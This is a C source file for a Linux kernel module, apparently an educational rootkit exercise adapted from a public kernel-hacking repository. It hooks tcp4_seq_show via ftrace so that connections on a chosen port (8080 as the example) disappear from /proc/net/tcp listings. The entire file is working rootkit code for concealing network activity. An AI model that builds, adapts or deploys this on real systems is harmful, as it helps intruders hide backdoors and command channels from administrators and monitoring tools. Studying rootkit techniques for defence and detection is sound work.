/**
 * Hiding ports.
 * 
 * @author Yekuuun
 * 
 * Sources : https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.6_hiding_ports/rootkit.c
 * 
 * Notes : 
 * This module focus only on kernel version > 4.17.0 for the the test using new pt_regs structs.
 */

#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>

#include "../lib/hook/ftrace_helper.h"

MODULE_AUTHOR("Yekuuun");
MODULE_DESCRIPTION("Hiding ports.");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.0.1");

#define MODNAME "HIDE_PORTS"

#define PORT_TO_HIDE 8080 //for example.

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

/**
 * Main hook for the syscall tcp4_seq_show
 */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
    struct inet_sock *is;
    long ret;
    unsigned short port = htons(PORT_TO_HIDE);

    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (port == is->inet_sport || port == is->inet_dport) {
			pr_err("[!] rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static int __init hide_ports_init(void){
#if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
    pr_err("[!] Unsupported kernel version or architecture.\n");
    return -EINVAL;
#endif

    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        pr_err("[%s] Failed to install hooks: %d\n", MODNAME, err);
        return err;
    }

    pr_info("[%s] Module loaded, hooks installed.\n", MODNAME);
    return 0;
}

static void __exit hide_ports_exit(void){
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("[%s] Module unloaded, hooks removed.\n", MODNAME);
}

module_init(hide_ports_init);
module_exit(hide_ports_exit);

